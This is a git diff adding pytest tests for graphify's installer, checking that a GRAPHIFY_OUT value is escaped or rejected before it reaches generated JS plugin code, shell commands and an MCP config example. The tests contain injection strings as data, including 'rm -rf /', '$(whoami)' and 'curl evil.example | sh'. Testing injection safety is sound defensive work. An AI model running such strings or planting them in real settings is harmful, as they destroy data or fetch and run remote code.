@@ -1423,3 +1423,124 @@ def test_project_uninstall_removes_the_bare_hook_command(tmp_path, monkeypatch):
             main()
 
     assert not [c for c in _hook_commands(settings.read_text(encoding="utf-8")) if "graphify" in c]
+
+
+# ── GRAPHIFY_OUT interpolation safety ──────────────────────────────────────────
+
+def test_js_string_escape_handles_both_quotes_and_newlines(monkeypatch):
+    """A value reaching a generated JS template must not be able to break out
+    of whichever quote style the surrounding literal uses, or corrupt the file
+    with a raw (un-escaped, illegal inside a JS string literal) newline."""
+    import graphify.install as install
+    escaped = install._js_string_escape('evil"\'\\\nend')
+    assert '"' not in escaped.replace('\\"', "")
+    assert "'" not in escaped.replace("\\'", "")
+    assert "\n" not in escaped
+    # Round-trips through an actual JS-style eval of the escaped form.
+    reconstructed = escaped.replace('\\"', '"').replace("\\'", "'").replace("\\n", "\n").replace("\\\\", "\\")
+    assert reconstructed == 'evil"\'\\\nend'
+
+
+def test_js_graph_exists_expr_escapes_a_quote_breaking_value(monkeypatch):
+    """#2571 follow-up: GRAPHIFY_OUT containing a double quote must not be able
+    to break out of the generated existsSync(join(..., "...", ...)) string and
+    inject arbitrary JS into the plugin file."""
+    import graphify.install as install
+    monkeypatch.setattr(install, "_GRAPHIFY_OUT", 'evil"; alert(1); //')
+    expr = install._js_graph_exists_expr()
+    assert 'alert(1)' in expr  # present, but only as inert string content
+    assert '");' not in expr  # the quote never actually closed the string early
+    # The malicious value's own quote is escaped (\"), not dropped: exactly
+    # the two structural open/close pairs join() needs, plus that one escaped
+    # occurrence, and every quote in the string is part of a \" pair.
+    assert expr.count('"') == 5
+    assert expr.count('\\"') == 1
+
+
+def test_shell_safe_out_name_rejects_metacharacters(monkeypatch):
+    """#2571 follow-up: the Kilo/OpenCode reminder text embeds GRAPHIFY_OUT in
+    a JS string literal that itself builds a shell command string later
+    assigned to output.args.command and actually executed -- two nested
+    contexts a JS-string escape alone does not make safe for (a shell
+    metacharacter like $, `, ", or ; would still reach the shell once the JS
+    string is evaluated). A value with any such character must fall back to
+    the packaged default instead of reaching either template unescaped."""
+    import graphify.install as install
+    for bad in ('evil"; rm -rf /', "evil`whoami`", "evil$(whoami)", "a;b", "a|b"):
+        monkeypatch.setattr(install, "_GRAPHIFY_OUT", bad)
+        assert install._shell_safe_out_name() == "graphify-out", bad
+    for good in ("graphify-out", "my_custom-out.dir", "sub/dir", "/abs/path"):
+        monkeypatch.setattr(install, "_GRAPHIFY_OUT", good)
+        assert install._shell_safe_out_name() == good
+
+
+def test_shell_safe_out_name_handles_windows_absolute_paths(monkeypatch):
+    """A Windows absolute path (C:\\Users\\me\\out) used to fall back to the
+    packaged default name too, even though it is a legitimate GRAPHIFY_OUT
+    value -- the plugin templates explicitly target Windows PowerShell
+    (#1646). The colon and backslash it needs are safe to allow through:
+    neither is a shell metacharacter in the surrounding double-quoted echo
+    context in bash or PowerShell. The backslash does need JS-string
+    escaping first, though -- an unescaped backslash before an ordinary
+    letter is not a recognized JS escape sequence, so the JS parser just
+    drops it, silently corrupting the path before the shell ever sees it."""
+    import graphify.install as install
+    win_path = r"C:\Users\me\out"
+    monkeypatch.setattr(install, "_GRAPHIFY_OUT", win_path)
+    escaped = install._shell_safe_out_name()
+    assert escaped == r"C:\\Users\\me\\out", escaped
+    # A JS engine parsing this as string-literal source content collapses
+    # each doubled backslash back to one, same as Python's own backslash
+    # escape handling for that one character class -- confirm the runtime
+    # value a shell would actually see matches the original path.
+    recovered = escaped.encode().decode("unicode_escape")
+    assert recovered == win_path, recovered
+
+
+def test_shell_safe_out_name_allows_spaces(monkeypatch):
+    """A custom output directory with a space (My Output Dir, or an absolute
+    path through a directory with one) used to fall back to the packaged
+    default too, even though a space is a common, entirely plausible path
+    character needing no escaping in either the JS string literal or the
+    surrounding double-quoted shell echo -- double quotes preserve a space
+    verbatim in both bash and PowerShell, so it cannot start a new word."""
+    import graphify.install as install
+    for good in ("My Output Dir", "/Users/john doe/graphify out"):
+        monkeypatch.setattr(install, "_GRAPHIFY_OUT", good)
+        assert install._shell_safe_out_name() == good
+
+
+def test_kilo_and_opencode_reminder_text_never_embeds_raw_graphify_out_value(monkeypatch):
+    """The Kilo/OpenCode plugin templates used to run the WHOLE template
+    through _out_doc's naive substring replace, so a malicious GRAPHIFY_OUT
+    landed in the shell-command string verbatim. Reload the module with an
+    adversarial value and confirm neither generated plugin source contains it
+    unescaped -- both must have fallen back to the safe default name."""
+    import importlib
+    import graphify.install as install_mod
+
+    monkeypatch.setenv("GRAPHIFY_OUT", 'evil"; curl evil.example | sh #')
+    try:
+        importlib.reload(install_mod)
+        assert 'curl evil.example' not in install_mod._KILO_PLUGIN_JS
+        assert 'curl evil.example' not in install_mod._OPENCODE_PLUGIN_JS
+        assert "graphify-out" in install_mod._KILO_PLUGIN_JS
+        assert "graphify-out" in install_mod._OPENCODE_PLUGIN_JS
+    finally:
+        monkeypatch.delenv("GRAPHIFY_OUT", raising=False)
+        importlib.reload(install_mod)
+
+
+def test_mcp_config_example_is_valid_json_for_a_quote_bearing_out_dir(monkeypatch):
+    """#2571 follow-up: the Antigravity install prints an MCP config example
+    for the user to copy; a GRAPHIFY_OUT containing a double quote used to
+    land in that example unescaped, printing invalid JSON."""
+    import json
+    import graphify.install as install
+    monkeypatch.setattr(install, "_GRAPHIFY_OUT", 'evil"path')
+    args_line = (
+        '    "args": ["run", "--with", "graphifyy", "--with", "mcp", "-m", "graphify.serve", '
+        + json.dumps(install._mcp_out_path_display()) + "]"
+    )
+    parsed = json.loads("{" + args_line.strip() + "}")
+    assert parsed["args"][-1] == install._mcp_out_path_display()
